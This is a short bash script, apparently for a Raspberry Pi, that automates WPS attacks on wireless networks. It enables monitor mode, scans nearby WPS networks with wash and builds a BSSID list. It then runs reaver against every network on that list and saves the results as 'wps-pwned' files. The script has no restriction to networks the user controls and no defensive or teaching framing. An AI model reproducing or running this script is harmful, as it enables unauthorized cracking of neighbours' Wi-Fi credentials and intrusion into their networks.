#!/bin/bash

#Color
 col='\033[0;33m'       # Yellow
 nc='\033[0m'       # No Color

# Enable monitor-mode
echo -e ${col} "Enabling monitor-mode" ${nc}

 sudo ip link set wlan1 down
 sudo iw wlan1 set monitor none
 sudo ip link set wlan1 up

# WPS network list
echo -e ${col} "Scaning wps network for 30 sec" ${nc}

 sudo timeout 30s wash -i wlan1 > washout.txt
 cat washout.txt

# Building bssid only list
 rm bssid.txt
echo -e ${col} "Creating bssid list" ${nc}

 filename='washout.txt'
 while read -r line
 do
   id=$(cut -c-17 <<< "$line")
   echo $id  >> bssid
 done < "$filename"

# Remove B8:27:EB:6E:4D:2B mac of wlan0 from bssid list
 tail -n+3 bssid | sed -e 's/\<B8:27:EB:6E:4D:2B\>//g' | sed -r '/^\s*$/d' > bssid.txt
 rm bssid
 cat bssid.txt

# Cracking using reaver 
echo -e ${col} "Running reaver" ${nc}
 rm wps-pwned.txt

 sudo rm /var/lib/reaver/*
 while IFS= read -r line; do
     sudo reaver -L -q -i wlan1 -b "$line" >> wps-pwned.txt
 done < bssid.txt

 cp wps-pwned.txt ~/hs/wps-pwned_`date +"%H:%M:%S:%d-%b-%Y"`.txt
 cat wps-pwned.txt


# Disabling monitor-mode and restore internet
echo -e ${col} "Restoring wlan1" ${nc}
 sudo ip link set wlan1 down
 sudo iw wlan1 set type managed
 sudo ip link set wlan1 up
#sudo systemctl restart wpa_supplicant@wlan1.service

echo -e ${col} "Finished!!" ${nc}

 sleep 5
 ping -O -c 4 1.1
